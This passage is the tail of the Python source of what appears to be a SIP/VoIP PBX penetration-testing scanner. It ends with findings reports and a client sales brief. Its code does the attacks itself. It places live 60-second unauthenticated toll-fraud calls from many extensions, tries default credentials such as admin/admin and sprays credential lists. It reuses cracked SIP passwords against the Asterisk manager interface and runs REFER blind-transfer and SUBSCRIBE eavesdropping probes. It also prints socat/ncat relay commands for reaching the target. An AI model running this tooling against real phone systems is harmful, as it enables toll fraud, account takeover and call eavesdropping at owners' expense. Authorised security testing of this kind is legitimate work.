                    _info(f"  {col.YELLOW}AUTO-FIX E:{col.RESET} 404 Not Found — auto-running "
                          f"prefix discovery to find correct dialplan access code", col)
                    _pfx_list = call.prefixes_for_fingerprint(h.fingerprint)
                    _auto_pfx, _auto_dest = call.discover_dialplan_prefix(
                        h.ip, effective_call_to, call_from,
                        port=args.port, timeout=args.timeout,
                        source_ip=_stun_public_ip or args.source_ip,
                        prefixes=_pfx_list,
                    )
                    if _auto_pfx is not None:
                        _info(f"  {col.GREEN}PREFIX FOUND:{col.RESET} {repr(_auto_pfx)} → "
                              f"{_auto_dest}", col)
                        effective_call_to = _auto_dest
                        result = _try_call(
                            f"Retry with discovered prefix {repr(_auto_pfx)}",
                            source_ip=_stun_public_ip or args.source_ip,
                        )
                        _attempts.append(("prefix-auto-discovered", result))
                    else:
                        _warn("  AUTO-FIX E: No working prefix found — PBX may require auth", col)

                # F) 401/407 Auth required — try AMI-cracked creds if available
                if result.status_code in (401, 407):
                    _ami_creds = [(c["username"], c["password"])
                                  for c in hr.get("credentials_found", [])]
                    if not _ami_creds:
                        # Try common defaults
                        _ami_creds = [("1000", "1000"), ("admin", "admin"),
                                      ("asterisk", "asterisk"), (call_from, call_from),
                                      (call_from, "1234"), (call_from, "")]
                    _info(f"  {col.YELLOW}AUTO-FIX F:{col.RESET} Auth required — trying "
                          f"{len(_ami_creds)} credential set(s)", col)
                    for _au, _ap in _ami_creds:
                        _r_auth = _try_call(
                            f"Auth retry: {_au}/{'*'*len(_ap or '')}",
                            username=_au, password=_ap,
                            source_ip=_stun_public_ip or args.source_ip,
                        )
                        _attempts.append((f"auth-{_au}", _r_auth))
                        if _r_auth.success or _r_auth.reached_dialplan:
                            result = _r_auth
                            break

            # ── Log all attempts summary ───────────────────────────────────
            if len(_attempts) > 1:
                _info("", col)
                _info(f"  {'─'*54}", col)
                _info(f"  ADAPTIVE RETRY SUMMARY ({len(_attempts)} attempts)", col)
                _info(f"  {'─'*54}", col)
                for _aname, _ar in _attempts:
                    _asym = ("✓ SUCCESS" if _ar.success else
                             "~ DIALPLAN" if _ar.reached_dialplan else
                             f"✗ [{_ar.status_code or 'T/O'}]")
                    _info(f"  {_asym:<14}  {_aname}", col)
                _info(f"  {'─'*54}", col)
                _info(f"  Best result: [{result.status_code or 'T/O'}] "
                      f"dialplan={result.reached_dialplan}  "
                      f"success={result.success}", col)
                _info(f"  {'─'*54}", col)
                _info("", col)
            state.call_test = {
                "call_to": effective_call_to, "call_from": call_from,
                "success": result.success,
                "reached_dialplan": result.reached_dialplan,
                "status_code": result.status_code,
                "reason": result.reason,
                "evidence": result.evidence,
                "trace": result.sip_trace,
                "srtp_state": result.srtp_state,
                "dtmf_digits_sent": result.dtmf_digits_sent,
                "anonymous_dialout": _anonymous_dialout_probe,
                "working_prefixes": [
                    {"prefix": p, "destination": d, "from_ext": e}
                    for p, d, e in all_working_prefixes
                ],
            }

            if result.success and _anonymous_dialout_probe:
                # Weak-line sweep: enumerate which extensions the PBX routes
                # without authentication (every one = a usable toll-fraud launch point).
                # Run dry_run so the destination only gets a brief ring per candidate.
                _wl_numeric = [
                    e for e in enumeration.SPECIAL_EXTENSIONS
                    if e.isdigit() and e != call_from
                ]
                _wl_extra = [str(n) for n in range(1001, 1006)] + \
                            ["100", "200", "300", "400", "500",
                             "2000", "3000", "4000"]
                _wl_cands = list(dict.fromkeys(_wl_numeric[:8] + _wl_extra))
                _wl_cands = [e for e in _wl_cands if e != call_from][:18]

                # Weak-line sweep: 60-second live calls from each candidate extension
                # (no dry_run — we need to confirm the call truly completes and observe
                # it on the destination phone, not just cancel at the provisional).
                _wl_call_dur = max(60.0, args.call_duration)
                _info(
                    f"Weak-line sweep: testing {len(_wl_cands)} extensions — "
                    f"LIVE {_wl_call_dur:.0f}s calls (no dry-run) to confirm "
                    f"unauthenticated outbound routing...",
                    col,
                )
                _weak_lines: list[str] = [call_from]  # already confirmed
                for _wext in _wl_cands:
                    _jitter_sleep(args.jitter)
                    _info(f"  Testing ext {col.BOLD}{_wext}{col.RESET} → {effective_call_to} "
                          f"({_wl_call_dur:.0f}s hold)...", col)
                    _wr = call.place_call(
                        h.ip, effective_call_to, _wext,
                        port=args.port,
                        timeout=args.timeout,
                        dry_run=False,
                        call_duration=_wl_call_dur,
                        max_wait=_wl_call_dur + 15.0,
                        traffic_log=traffic_log,
                        source_ip=args.source_ip,
                        source_port_range=source_port_range,
                    )
                    status = _wr.status_code or "timeout"
                    # ── Per-extension SIP trace ────────────────────────────
                    if _wr.sip_trace:
                        _info(f"    {'─'*48}", col)
                        _info(f"    SIP TRACE  ext={_wext}", col)
                        _info(f"    {'─'*48}", col)
                        for _tl in _wr.sip_trace:
                            _info(f"    {_tl}", col)
                        _info(f"    {'─'*48}", col)
                    # ── Per-extension diagnostic ───────────────────────────
                    _wdiag = call.diagnose_call_result(
                        _wr, host=h.ip, local_ip=_wr.local_ip_used,
                    )
                    _info(f"    DIAGNOSTIC  ext={_wext}:", col)
                    for _wdl in _wdiag.split("\n")[:8]:  # first 8 lines (risk summary)
                        _info(f"      {_wdl}", col)
                    if _wr.success or _wr.reached_dialplan:
                        _weak_lines.append(_wext)
                        _conf_note = " (CONFIRMED — BYE acked)" if _wr.call_confirmed else \
                                     " (200 OK — BYE unacked/NAT)" if _wr.success else \
                                     " (dialplan reached)"
                        _warn(
                            f"  {col.RED}Weak line: ext {col.BOLD}{_wext}{col.RESET}"
                            f"{col.RED} → dialplan accepted  [{status}]{_conf_note}{col.RESET}",
                            col,
                        )
                    else:
                        _info(f"  {_wext}: rejected  [{status}]", col)

                state.call_test["weak_lines"] = _weak_lines
                _warn(f"{col.RED}{col.BOLD}{len(_weak_lines)} weak line(s) confirmed{col.RESET}: "
                      f"{_weak_lines}", col)
                if len(_weak_lines) > 1:
                    _finding("high",
                             f"WEAK LINES: PBX routes unauthenticated calls from "
                             f"{len(_weak_lines)} distinct extensions — "
                             f"any SIP device on the network is a toll-fraud launch point: "
                             f"{_weak_lines}",
                             col)

            # ── SIP message trace ──────────────────────────────────────────
            if result.sip_trace:
                _info("", col)
                _info(f"  {'─'*54}", col)
                _info("  SIP CALL TRACE", col)
                _info(f"  {'─'*54}", col)
                for _tl in result.sip_trace:
                    _info(f"  {_tl}", col)
                _info(f"  {'─'*54}", col)

            # ── Comprehensive diagnostic report ────────────────────────────
            _diag = call.diagnose_call_result(
                result, host=h.ip, local_ip=result.local_ip_used,
            )
            _info("", col)
            _info(f"{'═'*60}", col)
            _info("  TOLL-FRAUD CALL DIAGNOSTIC REPORT", col)
            _info(f"  Target : {h.ip}:{args.port}  Platform: {h.fingerprint or 'unknown'}", col)
            _info(f"  From   : {call_from}  →  To: {effective_call_to}", col)
            _info(f"  Mode   : {_mode_label}", col)
            _info(f"{'─'*60}", col)
            for _dl in _diag.split("\n"):
                _info(f"  {_dl}", col)
            _info(f"{'═'*60}", col)
            _info("", col)

            # ── NAT auto-recover ───────────────────────────────────────────
            if result.nat_suspected:
                _warn(
                    f"NAT DETECTED: Contact IP ({result.local_ip_used}) is private "
                    f"but PBX ({h.ip}) is public — auto-attempting STUN recovery…",
                    col,
                )
                _nat_pub = _nat_auto_recover(h.ip, result.local_ip_used, args.timeout, col)
                if _nat_pub:
                    args.source_ip = _nat_pub
                    _ok(
                        f"NAT FIX APPLIED: future SIP exchanges will use "
                        f"{col.BOLD}{_nat_pub}{col.RESET} in Contact/Via headers.",
                        col,
                    )
                else:
                    _warn(
                        "STUN auto-fix unavailable. Bypass options:",
                        col,
                    )
                    if _EXT_TOOLS.get("socat"):
                        print(f"  {col.CYAN}  [socat] socat UDP-LISTEN:5060,fork UDP4:{h.ip}:5060{col.RESET}")
                    if _EXT_TOOLS.get("ncat"):
                        print(f"  {col.CYAN}  [ncat]  ncat -l -p 5060 --sh-exec 'ncat {h.ip} 5060'{col.RESET}")
                    print(f"  {col.YELLOW}  [manual] SSH/VPN tunnel into target network, or add --stun auto{col.RESET}")

            # ── Confirmed call announcement ────────────────────────────────
            if result.success and result.call_confirmed:
                _ok(
                    f"{col.BOLD}CALL FULLY CONFIRMED:{col.RESET} 200 OK + BYE acknowledged — "
                    f"complete RFC 3261 dialog. Hold: {result.hold_seconds_actual:.0f}s.",
                    col,
                )
            elif result.success and not result.call_confirmed:
                _warn(
                    f"CALL SIP-CONFIRMED (200 OK) but BYE not acknowledged. "
                    + ("NAT suspected — PBX cannot reach Contact IP."
                       if result.nat_suspected else
                       "Possible NAT or PBX behaviour — see diagnostic above."),
                    col,
                )

            # ── Severity findings ──────────────────────────────────────────
            if result.success and result.call_confirmed and _anonymous_dialout_probe:
                _finding("critical",
                         f"ANONYMOUS DIAL-OUT FULLY CONFIRMED (dialog complete) — "
                         f"unauthenticated call placed to {effective_call_to} "
                         f"without any credentials. Hold: {result.hold_seconds_actual:.0f}s. "
                         f"Attacker needs only network access to {h.ip}:{args.port}.",
                         col)
            elif result.success and _anonymous_dialout_probe:
                _finding("critical",
                         f"ANONYMOUS DIAL-OUT CONFIRMED — PBX routes PSTN calls from ANY "
                         f"unauthenticated SIP endpoint. Attacker needs only network access "
                         f"to {h.ip}:{args.port}. Extension {call_from} never registered. "
                         f"{result.status_code} {result.reason}"
                         + (" [NAT — BYE unacked]" if result.nat_suspected else ""),
                         col)
            elif result.success and result.call_confirmed:
                _finding("critical",
                         f"TOLL FRAUD FULLY CONFIRMED — call placed to {effective_call_to} "
                         f"as {call_from}, BYE acknowledged. "
                         f"Hold: {result.hold_seconds_actual:.0f}s. "
                         f"{result.status_code} {result.reason}",
                         col)
            elif result.success:
                _finding("critical",
                         f"TOLL FRAUD CONFIRMED — call placed to {effective_call_to}  "
                         f"{result.status_code} {result.reason}"
                         + (" [NAT — verify from target subnet]" if result.nat_suspected else ""),
                         col)
            elif result.status_code == 486:
                _finding("critical",
                         f"TOLL FRAUD CONFIRMED — 486 Busy: destination phone rang on PSTN. "
                         f"Call successfully reached {effective_call_to} via {h.ip}.",
                         col)
            elif result.reached_dialplan:
                _finding("high",
                         f"Dialplan engaged — PBX accepted INVITE and started routing  "
                         f"{result.status_code} {result.reason}",
                         col)
            else:
                _info(f"Call rejected at SIP layer — {result.status_code} {result.reason}", col)

            if result.srtp_state == "downgraded":
                _finding("medium",
                         "SRTP downgrade: PBX silently accepted cleartext media when SRTP was offered",
                         col)

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 4b · REFER / SUBSCRIBE PROBES  [{h.ip}]", col)

        # Auto-enable --check-refer when the Allow header advertises REFER or SUBSCRIBE
        _allow_methods = (state.sip or {}).get("allow", []) if state.sip else []
        _dangerous_in_allow = {"REFER", "SUBSCRIBE"} & {m.upper() for m in _allow_methods}
        if not getattr(args, "check_refer", False) and _dangerous_in_allow:
            _warn(
                f"Allow header advertises {sorted(_dangerous_in_allow)} — "
                "auto-enabling --check-refer probe",
                col,
            )
            args.check_refer = True

        if getattr(args, "check_refer", False):
            from scanner import sip as sip_mod

            # ── SUBSCRIBE presence/dialog-event eavesdrop probe ──────────
            _sub_exts = (
                [e["extension"] for e in state.extension_list[:3]]
                if state.extension_list
                else ["1000"]
            )
            _info(
                f"SUBSCRIBE presence probe on {len(_sub_exts)} extension(s): "
                f"{_sub_exts}",
                col,
            )
            _sub_results: list[dict] = []
            for _sx in _sub_exts:
                _jitter_sleep(args.jitter)
                _sr = sip_mod.subscribe_probe(
                    h.ip, _sx, "presence",
                    port=sip_port, timeout=args.timeout,
                    traffic_log=traffic_log,
                )
                _sub_code = _sr.status_code if _sr else None
                _sub_results.append({"ext": _sx, "code": _sub_code})
                if _sub_code == 200:
                    _finding(
                        "high",
                        f"SUBSCRIBE presence 200 OK for ext {_sx} — "
                        "presence harvesting and dialog-event eavesdrop possible",
                        col,
                    )
                elif _sub_code == 403:
                    _info(
                        f"SUBSCRIBE ext {_sx}: 403 Forbidden — extension exists but protected",
                        col,
                    )
                elif _sub_code == 404:
                    _info(f"SUBSCRIBE ext {_sx}: 404 Not Found", col)
                else:
                    _info(f"SUBSCRIBE ext {_sx}: {_sub_code or 'timeout'}", col)

            # Dialog-event eavesdrop variant
            _jitter_sleep(args.jitter)
            _de_sr = sip_mod.subscribe_probe(
                h.ip, _sub_exts[0], "dialog",
                port=sip_port, timeout=args.timeout,
                traffic_log=traffic_log,
            )
            if _de_sr and _de_sr.status_code == 200:
                _finding(
                    "high",
                    f"SUBSCRIBE dialog 200 OK for ext {_sub_exts[0]} — "
                    "call-state eavesdrop via dialog-event package confirmed",
                    col,
                )

            state.subscribe_probes = _sub_results

            # ── REFER blind-transfer toll-fraud PoC ───────────────────────
            _refer_to = getattr(args, "refer_to", None) or args.call_to
            if _refer_to:
                _refer_from = args.call_from or (
                    state.extension_list[0]["extension"] if state.extension_list else "1000"
                )
                _info(
                    f"REFER blind-transfer PoC: from={_refer_from} "
                    f"refer-to={_refer_to}",
                    col,
                )
                _jitter_sleep(args.jitter)
                _refer_result = call.test_refer_blind_transfer(
                    h.ip, _refer_from, _refer_to,
                    port=sip_port,
                    username=args.username if hasattr(args, "username") else None,
                    password=args.password if hasattr(args, "password") else None,
                    timeout=args.timeout,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip,
                    source_port_range=source_port_range,
                )
                state.refer_probe = _refer_result
                if _refer_result["is_vulnerable"]:
                    _finding(
                        "critical",
                        f"REFER BLIND-TRANSFER ACCEPTED — {_refer_result['evidence']}",
                        col,
                    )
                elif _refer_result["status_code"] == 403:
                    _info(f"REFER: {_refer_result['evidence']}", col)
                else:
                    _info(f"REFER: {_refer_result['evidence']}", col)
            else:
                _info(
                    "REFER PoC skipped — provide --refer-to <number> or --call-to to run it",
                    col,
                )
        else:
            _info(
                "REFER/SUBSCRIBE probes skipped (use --check-refer or ensure "
                "REFER/SUBSCRIBE appear in Allow header)",
                col,
            )

        if False and args.enum:  # pragma: no cover
            if ami_dumped_exts:
                # AMI gave us ground truth — skip wordlist
                ext_list = ami_dumped_exts
                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
                _jitter_sleep(args.jitter)
                found = enumeration.sweep(
                    h.ip, ext_list, port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    header_ip=_spoof_header_ip,
                    extra_headers=_base_extra_headers or None,
                )
            elif args.ext_range:
                ext_list = enumeration.expand_ext_range(args.ext_range)
                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
                prog = Progress("REGISTER sweep", len(ext_list), col)
                _jitter_sleep(args.jitter)
                found = enumeration.sweep(
                    h.ip, ext_list, port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log, progress_cb=prog.tick,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
                prog.close()
            else:
                # Auto-select ranges based on fingerprint (full mode) or wordlist
                if args.full:
                    ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
                    found_all: list[enumeration.ExtensionResult] = []
                    seen_exts: set[str] = set()

                    # Pass 1: special / feature-code extensions
                    specials = enumeration.SPECIAL_EXTENSIONS[:]
                    _jitter_sleep(args.jitter)
                    sf = enumeration.sweep(
                        h.ip, specials, port=sip_port,
                        timeout=args.timeout, max_workers=args.workers,
                        traffic_log=traffic_log,
                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    )
                    for r in sf:
                        if r.extension not in seen_exts:
                            seen_exts.add(r.extension)
                            found_all.append(r)
                    if sf:
                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)

                    # Pass 2: priority extensions — 1000+ most common across all
                    # brands, probed before the adaptive sweep to surface hits fast
                    prio_path = os.path.join(
                        os.path.dirname(__file__),
                        "wordlists", "extensions_priority.txt"
                    )
                    if os.path.exists(prio_path):
                        with open(prio_path) as _pf:
                            prio_list = [
                                ln.strip() for ln in _pf
                                if ln.strip() and not ln.startswith("#")
                                and ln.strip() not in seen_exts
                            ]
                        _info(f"Priority sweep: {len(prio_list)} common extensions "
                              f"({h.fingerprint} platform)...", col)
                        prog = Progress("Priority sweep", len(prio_list), col)
                        _jitter_sleep(args.jitter)
                        pf = enumeration.sweep(
                            h.ip, prio_list, port=sip_port,
                            timeout=args.timeout, max_workers=args.workers,
                            traffic_log=traffic_log, progress_cb=prog.tick,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                        )
                        prog.close()
                        for r in pf:
                            if r.extension not in seen_exts:
                                seen_exts.add(r.extension)
                                found_all.append(r)
                        if pf:
                            _ok(f"Priority hits: {[r.extension for r in pf]}", col)

                    # Pass 3: adaptive sweep over 100-5000 to fill gaps
                    _info(f"Fingerprint: {h.fingerprint} — adaptive sweep "
                          f"over ranges {ranges} (filling gaps)...", col)
                    for (lo, hi) in ranges:
                        total_coarse = (hi - lo) // 10 + 1
                        _info(f"Adaptive sweep {lo}–{hi} (~{total_coarse} coarse probes)...", col)
                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
                        _jitter_sleep(args.jitter)
                        batch = enumeration.adaptive_sweep(
                            h.ip, port=sip_port, low=lo, high=hi,
                            timeout=args.timeout, max_workers=args.workers,
                            traffic_log=traffic_log, progress_cb=prog.tick,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                        )
                        prog.close()
                        for r in batch:
                            if r.extension not in seen_exts:
                                seen_exts.add(r.extension)
                                found_all.append(r)

                    found = found_all
                else:
                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
                    prog = Progress("REGISTER sweep", len(ext_list), col)
                    _jitter_sleep(args.jitter)
                    found = enumeration.sweep(
                        h.ip, ext_list, port=sip_port,
                        timeout=args.timeout, max_workers=args.workers,
                        traffic_log=traffic_log, progress_cb=prog.tick,
                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    )
                    prog.close()

            # INVITE-probe found extensions for anonymous-call acceptance
            if found:
                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
                prog2 = Progress("INVITE probe", len(found), col)
                _jitter_sleep(args.jitter)
                inv_map = enumeration.probe_invite_acceptance(
                    h.ip, [r.extension for r in found], port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log, progress_cb=prog2.tick,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
                prog2.close()
                for r in found:
                    inv = inv_map.get(r.extension)
                    if inv:
                        r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
                        r.auth_required = r.auth_required and inv.auth_required

            hr["extensions"] = [asdict(x) for x in found]
            anon = sum(1 for x in found if x.anonymous_invite)
            open_reg = sum(1 for x in found if x.open_register)
            _ok(f"{len(found)} extension(s) found — "
                f"auth_required:{len(found)-anon}  "
                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
                col)
            for r in found:
                flags = []
                if r.anonymous_invite:
                    flags.append(f"{col.RED}anon-invite{col.RESET}")
                if r.open_register:
                    flags.append(f"{col.RED}open-register{col.RESET}")
                if r.auth_required:
                    flags.append("auth-required")
                _info(f"  ext {col.BOLD}{r.extension}{col.RESET}  " + "  ".join(flags), col)
            if not found and args.call_test:
                _warn("0 extensions enumerated — PBX may suppress REGISTER probes or use "
                      "a non-standard range. Phase 6 will probe for ANONYMOUS DIAL-OUT: "
                      "whether the PBX routes PSTN calls from completely unknown/unregistered "
                      "extensions with no credentials.", col)


        # Phase 6 credential spray block was moved above the call test
        # (now runs as part of the Phase 6 block inserted before Phase 4).
        # The following guard prevents a double-run on any old code path:
        if False and args.spray and state.extension_list:  # DEAD — kept for diff clarity
            creds = auth.load_credentials(args.cred_file)
            if args.grandstream_creds or h.fingerprint == "Grandstream":
                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
                if os.path.exists(gs_path):
                    creds.extend(auth.load_credentials(gs_path))
            targets_for_spray = [e["extension"] for e in hr["extensions"]
                                  if e.get("auth_required")]
            if targets_for_spray:
                total_attempts = len(creds) * len(targets_for_spray)
                _info(f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
                      f"extension(s) = {total_attempts} attempts (max-failures={args.max_failures_per_ext})...", col)
                prog = Progress("Spray", len(targets_for_spray), col)
                _jitter_sleep(args.jitter)
                # Build priority password pool: AMI-cracked + SIP-cracked passwords tried first
                ami_pwds: list[str] = []
                if hr.get("ami") and hr["ami"].get("success") and hr["ami"].get("password"):
                    ami_pwds.append(hr["ami"]["password"])
                for _cc in hr.get("cracked_credentials", []):
                    _p = _cc.get("password", "")
                    if _p and _p not in ami_pwds:
                        ami_pwds.append(_p)
                if ami_pwds:
                    _info(
                        f"Adaptive: {len(ami_pwds)} pre-cracked password(s) promoted to "
                        f"front of spray queue.",
                        col,
                    )
                hits_spray = auth.spray(
                    h.ip, targets_for_spray, creds,
                    port=sip_port, timeout=args.timeout,
                    max_workers=args.workers,
                    max_failures_per_ext=args.max_failures_per_ext,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    ami_cracked_passwords=ami_pwds,
                    hash_log_path=os.path.join(report_dir, "sip_hashes.txt") if args.report_dir else None,
                )
                prog.close()
                successes = [asdict(c) for c in hits_spray if c.success]
                hr["credentials_found"] = successes
                if successes:
                    for c in successes:
                        _finding("critical",
                                 f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
                                 f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
                                 col)
                else:
                    _info("No credentials cracked.", col)

                # Credential reuse: try cracked SIP passwords against AMI
                if successes and hr.get("ami") and not hr["ami"].get("success"):
                    _sip_passwords = list({c["password"] for c in successes if c.get("password")})
                    if _sip_passwords:
                        _info(f"Credential reuse: trying {len(_sip_passwords)} cracked SIP password(s) against AMI...", col)
                        from scanner import ami as _ami
                        for _pwd in _sip_passwords[:5]:
                            for _user in ["admin", "asterisk", successes[0].get("username", "admin")]:
                                _reuse = _ami.try_login(h.ip, _user, _pwd, port=5038, timeout=args.timeout)
                                if _reuse and _reuse.get("success"):
                                    _warn(f"AMI credential reuse: SIP password '{_pwd}' works on AMI as '{_user}'!", col)
                                    hr["ami"]["reuse_hit"] = {"username": _user, "password": _pwd}
                                    _finding("critical", f"CREDENTIAL REUSE: SIP password '{_pwd}' grants AMI access as '{_user}' — full PBX control", col)
                                    break

                # --auto: also try INVITE-based auth spray for extensions that only
                # challenge INVITE (some PBXes skip REGISTER challenge)
                if args.auto and not successes:
                    invite_auth_exts = [
                        e["extension"] for e in hr["extensions"]
                        if e.get("auth_required")
                    ]
                    if invite_auth_exts:
                        _info(
                            f"AUTO mode: trying INVITE-based auth spray on "
                            f"{len(invite_auth_exts)} extension(s) "
                            f"(some PBXes only challenge INVITE, not REGISTER)...",
                            col,
                        )
                        _jitter_sleep(args.jitter)
                        invite_hits = auth.spray(
                            h.ip, invite_auth_exts, creds,
                            port=sip_port, timeout=args.timeout,
                            max_workers=args.workers,
                            max_failures_per_ext=args.max_failures_per_ext,
                            traffic_log=traffic_log,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                            method="INVITE",
                            hash_log_path=os.path.join(report_dir, "sip_hashes.txt") if args.report_dir else None,
                        )
                        invite_successes = [asdict(c) for c in invite_hits if c.success]
                        if invite_successes:
                            hr["credentials_found"].extend(invite_successes)
                            for c in invite_successes:
                                _finding(
                                    "critical",
                                    f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
                                    f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
                                    col,
                                )
                        else:
                            _info("INVITE-based auth spray: no additional credentials found.", col)
            else:
                _info("No auth-required extensions to spray.", col)
        elif args.spray:
            _info("No extensions found — skipping credential spray.", col)


        host_reports.append(state.to_host_report())

    # ══════════════════════════════════════════════════════════════════════
    _phase("REPORT", col)

    final_report = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "operator": operator,
        "target": args.target,
        "scope_file": args.scope_file or "",
        "scope_sha256": scope_sha or "",
        "args": {k: v for k, v in vars(args).items()
                 if not callable(v) and not k.startswith("_")},
        "hosts": host_reports,
    }
    paths = report.write_all(report_dir, final_report)
    traffic_log.close()

    # Stop NAT keepalive thread (if started)
    try:
        _keepalive_stop.set()  # type: ignore[name-defined]
    except NameError:
        pass

    # Clean up UPnP port mappings created during this session
    if _nat_ctx is not None:
        try:
            from scanner import nat as _nat_mod
            _nat_mod.teardown(_nat_ctx)
        except Exception:
            pass

    # --json-output: write machine-readable findings to a user-specified path
    if args.json_output:
        import json as _json
        _json_out = {
            "scan_meta": {
                "target": final_report.get("target", ""),
                "timestamp": final_report.get("timestamp", ""),
                "tool_version": final_report.get("tool_version", ""),
            },
            "summary": {
                "critical": counts.get("critical", 0),
                "high":     counts.get("high", 0),
                "medium":   counts.get("medium", 0),
                "low":      counts.get("low", 0),
                "total_findings": sum(counts.get(s, 0)
                                      for s in ("critical", "high", "medium", "low")),
            },
            "cve_findings": [
                f for h in final_report.get("hosts", [])
                for f in h.get("cve_findings", [])
            ],
            "credential_hits": [
                c for h in final_report.get("hosts", [])
                for c in h.get("credentials_found", [])
            ],
            "ami_findings": [
                {"host": h["ip"], **h["ami"]}
                for h in final_report.get("hosts", [])
                if h.get("ami") and h["ami"].get("success")
            ],
            "call_results": [
                h["call_test"]
                for h in final_report.get("hosts", [])
                if h.get("call_test")
            ],
        }
        try:
            with open(args.json_output, "w") as _jf:
                _json.dump(_json_out, _jf, indent=2, default=str)
            _ok(f"{'JSON findings':<26} : {args.json_output}", col)
        except OSError as _je:
            _warn(f"Could not write JSON output to {args.json_output}: {_je}", col)

    counts = final_report.get("severity_counts", {})

    # risk_score is stored as an int by write_all(); normalise to dict for display
    _rs_raw = final_report.get("risk_score", 0)
    if isinstance(_rs_raw, dict):
        rs = _rs_raw
    else:
        _score_int = int(_rs_raw) if _rs_raw else 0
        rs = {
            "score": _score_int,
            "band": (
                "CRITICAL" if _score_int >= 75 else
                "HIGH"     if _score_int >= 50 else
                "MEDIUM"   if _score_int >= 25 else
                "LOW"
            ),
        }

    # toll_fraud_estimate uses monthly_estimate_usd; map to display keys
    _tf_raw = final_report.get("toll_fraud_estimate", {})
    if _tf_raw and "high_usd" not in _tf_raw:
        _monthly = _tf_raw.get("monthly_estimate_usd", 0)
        tf = {
            "high_usd": int(_monthly * 1.5),
            "low_usd": int(_monthly * 0.5),
            "proven": _tf_raw.get("risk_level", "LOW") == "CRITICAL",
            "scenario": _tf_raw.get("calculation_basis", ""),
        }
    else:
        tf = _tf_raw

    # Findings summary banner
    print()
    print(f"  {'─' * 60}")
    print(f"  {'FINDINGS SUMMARY':^60}")
    print(f"  {'─' * 60}")
    for sev in ("critical", "high", "medium", "low", "info"):
        n = counts.get(sev, 0)
        if n == 0:
            continue
        bar = "█" * min(n, 30)
        print(f"  {col.for_severity(sev)}{sev.upper():8}{col.RESET}  {bar} {n}")
    print(f"  {'─' * 60}")

    # Risk score — displayed prominently
    if rs:
        score = rs.get("score", 0)
        band = rs.get("band", "")
        band_col = col.for_severity(
            "critical" if score >= 75 else
            "high"     if score >= 50 else
            "medium"   if score >= 25 else "info"
        )
        print()
        _info(
            f"RISK SCORE: {band_col}{col.BOLD}{score}/100 [{band}]{col.RESET}",
            col,
        )

    # Toll-fraud exposure — displayed prominently
    if tf and tf.get("high_usd", 0) > 0:
        proven = tf.get("proven", False)
        low_usd = tf.get("low_usd", 0)
        high_usd = tf.get("high_usd", 0)
        proven_label = (f"{col.RED}PROVEN{col.RESET}" if proven
                        else f"{col.YELLOW}ESTIMATED{col.RESET}")
        def _fmt_usd(v: int) -> str:
            if v >= 10000:
                return f"${v // 1000}k"
            return f"${v:,}"
        _warn(
            f"Estimated monthly exposure: {_fmt_usd(low_usd)}–{_fmt_usd(high_usd)}  "
            f"[{proven_label}]",
            col,
        )
        if tf.get("scenario"):
            print(f"  {tf['scenario']}")

    print(f"\n  {'─' * 60}")
    print()
    for k, pth in paths.items():
        if k == "findings":
            label = "findings (actionable)"
        elif k == "sales_brief":
            label = "sales brief (client)"
        else:
            label = k
        _ok(f"{label:<26} : {pth}", col)

    # sales_brief.html path
    sales_brief_path = os.path.join(report_dir, "sales_brief.html")
    if os.path.exists(sales_brief_path):
        _ok(f"{'sales_brief':<26} : {sales_brief_path}", col)

    _ok(f"{'traffic':<26} : {os.path.join(report_dir, 'traffic.log')}", col)
    print()

    return 0


if __name__ == "__main__":
    sys.exit(main())
